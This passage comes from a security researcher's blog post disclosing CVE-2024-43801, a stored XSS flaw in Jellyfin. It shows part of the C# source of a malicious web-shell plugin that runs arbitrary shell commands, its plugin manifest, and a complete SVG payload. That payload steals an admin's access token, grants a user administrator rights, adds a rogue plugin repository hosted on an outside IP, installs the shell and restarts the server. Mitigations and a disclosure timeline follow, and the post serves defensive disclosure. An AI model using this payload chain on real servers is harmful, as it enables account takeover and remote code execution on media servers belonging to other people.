    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardOutput</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardInput</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardError</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="n">new_process</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">CreateNoWindow</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="n">new_process</span><span class="p">.</span><span class="nf">Start</span><span class="p">();</span>

    <span class="kt">string</span> <span class="n">output</span> <span class="p">=</span> <span class="n">new_process</span><span class="p">.</span><span class="n">StandardOutput</span><span class="p">.</span><span class="nf">ReadToEnd</span><span class="p">();</span>
    <span class="kt">string</span> <span class="n">htmlOutput</span> <span class="p">=</span> <span class="s">$"&lt;pre&gt;</span><span class="p">{</span><span class="n">output</span><span class="p">}</span><span class="s">&lt;/pre&gt;"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nf">Content</span><span class="p">(</span><span class="n">htmlOutput</span><span class="p">,</span> <span class="s">"text/html"</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">private</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">OSCheck</span><span class="p">(){</span>         
    <span class="k">if</span><span class="p">(</span> <span class="n">OperatingSystem</span><span class="p">.</span><span class="nf">IsWindows</span><span class="p">()</span> <span class="p">){</span>
      <span class="k">return</span> <span class="s">"powershell.exe"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">return</span> <span class="s">"sh"</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This malicious plugin creates an endpoint that will take a command, check if the underlying operating system is Windows or Linux, and execute that command in their respective shell. This plugin is built into a DLL and stored in a ZIP file hosted alongside a “manifest.json” file which Jellyfin requires to install the plugin.</p>

<p>The “manifest.json” file contains the metadata of the plugin in a JSON object. After finding an example file online, a unique <code class="language-plaintext highlighter-rouge">guid</code> was generated, the <code class="language-plaintext highlighter-rouge">sourceURL</code> of the zip containing the DLL was added, and the <code class="language-plaintext highlighter-rouge">checksum</code> calculated we had the below file:</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"category"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Authentication"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"guid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"a4df60c5-6ab4-412a-8f79-2cab93fb2bc5"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"super_secret_web_shell"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A super secret webshell that will be installed silently via XSS"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"owner"</span><span class="p">:</span><span class="w"> </span><span class="s2">"itz-d0dgy"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"overview"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RCE"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"versions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"sourceUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://192.168.6.213:8000/test.zip"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"checksum"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"1e6e6d1ac46d3141a0a6315744747b26"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"changelog"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bug fixes and improvements"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"targetAbi"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.6.0.0"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"timestamp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2020-03-27 06:02:58"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0.7.0"</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>It was also pointed out to us later down the track that we could have just used an existing plugin crafted by <a href="https://gebir.ge/blog/peanut-butter-jellyfin-time/">Frederic Linn</a> in their glorous blog ‘Peanut Butter Jellyfin Time’, however it was 1am and we failed to flex our google foo, and on the flip side we would have missed out on learning how the plugin manifest file worked and silently abusing the install plugin functionality.</p>

<p>Ultimately all we had to do was modify the SVG to silently add the malicious repo, silently install the plugin, and upon completion, reboot the server. Hey what the hell, let’s escalate our privileges too while we are at it! The SVG payload ended up looking like this:</p>

<div class="language-xml highlighter-rouge"><div class="code-header">
        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" standalone="no"?&gt;</span>
<span class="cp">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span>
<span class="nt">&lt;svg</span> <span class="na">version=</span><span class="s">"1.1"</span> <span class="na">baseProfile=</span><span class="s">"full"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;polygon</span> <span class="na">id=</span><span class="s">"triangle"</span> <span class="na">points=</span><span class="s">"0,0 0,50 50,0"</span> <span class="na">fill=</span><span class="s">"#009900"</span> <span class="na">stroke=</span><span class="s">"#004400"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;script</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
    var token = JSON.parse(localStorage.getItem("jellyfin_credentials")).Servers[0].AccessToken;

    // Request To Make Low Priv User Admin Because Why Not
    setTimeout(function(){
      var xhttp_priv_esc = new XMLHttpRequest();
      xhttp_priv_esc.open("POST", "/Users/d420c356f7db4874bcbf94016ebe1529/Policy", true);
      xhttp_priv_esc.setRequestHeader("Content-type", "application/json");
      xhttp_priv_esc.setRequestHeader("X-Emby-Authorization", "MediaBrowser Client='Jellyfin Web', Token="+token);
      xhttp_priv_esc.send(JSON.stringify({"IsAdministrator":true}));
    }, 200);
    
    // Request To Silently Add Malicious Repo
    setTimeout(function(){
      var xhttp_add_repo = new XMLHttpRequest();
      xhttp_add_repo.open("POST", "/Repositories", true);
      xhttp_add_repo.setRequestHeader("Content-type", "application/json");
      xhttp_add_repo.setRequestHeader("X-Emby-Authorization", "MediaBrowser Client='Jellyfin Web', Token="+token);
      xhttp_add_repo.send(JSON.stringify([{"Name":"Jellyfin Stable","Url":"https://repo.jellyfin.org/releases/plugin/manifest-stable.json","Enabled":true},{"Name":"RCE","Url":"http://192.168.6.213:8000/manifest.json","Enabled":true}]));
    }, 300);

    // Request To Silently Install Malicious Plugin
    setTimeout(function(){
      var xhttp_install_plugin = new XMLHttpRequest();
      xhttp_install_plugin.open("POST", "/Packages/Installed/RCE?AssemblyGuid=a4df60c56ab4412a8f792cab93fb2bc5<span class="ni">&amp;amp;</span>version=1.0.7.0", true);
      xhttp_install_plugin.setRequestHeader("Content-type", "application/json");
      xhttp_install_plugin.setRequestHeader("X-Emby-Authorization", "MediaBrowser Client='Jellyfin Web', Token="+token);
      xhttp_install_plugin.send();
      
      // Request To Restart Jellyfin
      xhttp_install_plugin.onreadystatechange = function() {
        if (this.status == 200) {
          var xhttp_reboot_jellyfin = new XMLHttpRequest();
          xhttp_reboot_jellyfin.open("POST", "/System/Restart", true); // /System/Shutdown also works
          xhttp_reboot_jellyfin.setRequestHeader("Content-type", "application/json");
          xhttp_reboot_jellyfin.setRequestHeader("X-Emby-Authorization", "MediaBrowser Client='Jellyfin Web', Token="+token);
          xhttp_reboot_jellyfin.send();
        }
      }
    }, 400);
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Once again, we could wait for the chance that an administrator looks at our profile picture, or we could just send them a link to our profile to retrieve their token and install a plugin (as them) and then BOOM, we have a shell!</p>

<p><a href="/commons/jellyfin_webshell.webp" class="popup img-link  shimmer"><img src="/commons/jellyfin_webshell.webp" alt="Web Shell" loading="lazy"></a></p>

<h2 id="good-practice"><span class="me-2">Good practice</span><a href="#good-practice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>There are several issues here that allowed this exploitation chain. Preventing any one of them would have made this exploit significantly harder if not impossible.</p>

<ol>
  <li>Implementing the <code class="language-plaintext highlighter-rouge">content-disposition: attachment</code> header. This would force the file to be downloaded instead of rendered in the browser.</li>
  <li>Sanitising the SVG upon upload, and stripping out known malicious tags. An excellent library for performing that in JavaScript is <a href="https://github.com/cure53/DOMPurify">DOMPurify</a>.</li>
  <li>Implementing a content security policy (CSP) on directly accessed assets could have prevented any Stored XSS payload from triggering.</li>
  <li>Requiring re-authentication for any privileged functionality (like installing a new add-on or escalating a user to admin) would also be recommended.</li>
</ol>

<h2 id="disclosure-timeline"><span class="me-2">Disclosure timeline</span><a href="#disclosure-timeline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li>17/03/2024: Disclosure submitted to Jellyfin</li>
  <li>18/03/2024: Confirmed receipt of disclosure by Jellyfin</li>
  <li>27/03/2024: Creation of private GHSA by Jellyfin</li>
  <li>03/04/2024: Added to private GHSA by Jellyfin</li>
  <li>25/04/2024: Confirmation of issue presented by Jellyfin</li>
  <li>23/08/2024: Notice of intent to fix in 10.9.10</li>
  <li>25/08/2024: CVE requested</li>
  <li>27/08/2024: CVE issued - <a href="https://github.com/jellyfin/jellyfin/security/advisories/GHSA-vcmh-9wx9-rfqh">CVE-2024-43801</a></li>
  <li>03/09/2024: Blog post published.</li>
</ul>

<h2 id="reporters"><span class="me-2">Reporters</span><a href="#reporters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li><a href="https://github.com/itz-d0dgy">Jack Moran (itz-d0dgy)</a></li>
  <li><a href="https://github.com/kaiwhata">Elf Eldridge (Kaiwhata)</a></li>
</ul>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/cve/">CVE</a>,
          <a href="/categories/xss/">XSS</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/DEADLOCK/">Deadlock SSRF to IP disclosure</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-36814/">CVE-2024-36814 - Adguard Home Arbitrary File Read</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-43801/">CVE-2024-43801 - Jellyfin XSS</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-41808/">CVE-2024-41808 - Unauthenticated log injection to account takeover</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CVE-2024-30931/">CVE-2024-30931 - Emby XSS</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->


















            </div>

            
              
              



  <section id="toc-wrapper" class="d-none ps-0 pe-4">
    <h2 class="panel-heading ps-3 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/CVE-2024-30931/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1718830800"
  data-df="ll"
  
>
  Jun 19, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-30931 - Emby XSS</h4>
              <div class="text-muted">
                <p>Emby Media Server XSS

TL;DR - Whilst playing with Emby Media Server 4.8.3.0, we found stored XSS and, due to other security configurations in the platform, we were able to craft a payload that res...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CVE-2024-36814/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1728248400"
  data-df="ll"
  
>
  Oct  6, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-36814 - Adguard Home Arbitrary File Read</h4>
              <div class="text-muted">
                <p>Adguard Home Arbitrary File Read
TL;DR - Adguard Home deployments using versions 0.107.52 or lower are vulnerable to Arbitrary File Read which allowed a local authenticated user to target privilege...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CVE-2024-41808/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1722805200"
  data-df="ll"
  
>
  Aug  4, 2024
</time>

              <h4 class="pt-0 my-2">CVE-2024-41808 - Unauthenticated log injection to account takeover</h4>
              <div class="text-muted">
                <p>OpenObserve vulnerability chain

TL;DR - OpenObserve deployments using version 0.9.1 or lower are vulnerable to the following privilege escalation chain:

  A malicious user submits logs via a serv...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/CVE-2024-41808/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>CVE-2024-41808 - Unauthenticated log injection to account takeover</p>
    </a>
  

  
    <a
      href="/posts/CVE-2024-36814/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>CVE-2024-36814 - Adguard Home Arbitrary File Read</p>
    </a>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://github.com/happy-little-accidents">happy-little-accidents</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.0.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->
    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js,npm/tocbot@4.27.20/dist/tocbot.min.js"></script>






<script src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  







    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  <!-- Cloudflare Pages Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "5a0d6439923d4c8582697636643f8128"}'></script><!-- Cloudflare Pages Analytics --></body>
</html>

